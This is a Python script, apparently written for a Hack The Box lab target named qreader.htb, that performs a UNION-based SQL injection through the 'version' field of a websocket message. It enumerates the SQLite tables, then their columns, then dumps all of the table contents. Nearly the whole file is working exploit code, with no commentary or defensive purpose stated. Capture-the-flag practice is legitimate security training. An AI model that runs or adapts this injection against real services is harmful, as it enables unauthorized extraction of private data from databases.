#!./venv/bin/python3

import asyncio
import requests
from websockets import connect, exceptions
from json import loads,dumps
from string import ascii_letters, digits, punctuation

async def send(socketUrl, payload: dict) -> str:
    async with connect(socketUrl) as soc:
        await soc.send(dumps(payload))
        response = await soc.recv()
        responseJson = loads(response)
        message = responseJson.get("message")

        if message == "Invalid version!":
            return ""
        return message.get("downloads")

async def attempt(socketUrl, sql) -> bool:
    payload = {"version": f"\" UNION SELECT NULL,NULL,NULL,{sql}--"}
    return await send(socketUrl, payload)

async def enumMultipleText(socketUrl, sql) -> list:
    result = []
    output = "placeholder"

    index = 0
    while len(output) > 0:
        output = await attempt(socketUrl, f"{sql} limit {index},1")
        output = str(output)
        index += 1
        if len(output) > 0:
            result.append(output)

    return result

async def enumContent(socketUrl, schema:dict) -> dict:
    result = {}
    for table, columns in schema.items():
        columns_result = {}
        for column in columns:
            content = await enumMultipleText(socketUrl, f"{column} from {table}")
            columns_result[column] = content
        result[table] = columns_result

    return result

async def enumColumns(socketUrl, tables: list) -> dict:
    result = {}
    for table in tables:
        columns = await enumMultipleText(socketUrl, f"name from PRAGMA_TABLE_INFO('{table}')")
        result[table] = columns

    return result

async def enumTables(socketUrl) -> list:
    return await enumMultipleText(socketUrl, "name from sqlite_schema where type='table' and name not like 'sqlite_%'")

async def main():
    socketUrl = "ws://ws.qreader.htb:5789/version"
    tables = await enumTables(socketUrl)
    columns = await enumColumns(socketUrl, tables)
    content = await enumContent(socketUrl, columns)
    print("\nResults :")
    print(f"Content: {dumps(content, indent=2)}")

if __name__ == "__main__":
    asyncio.run(main())

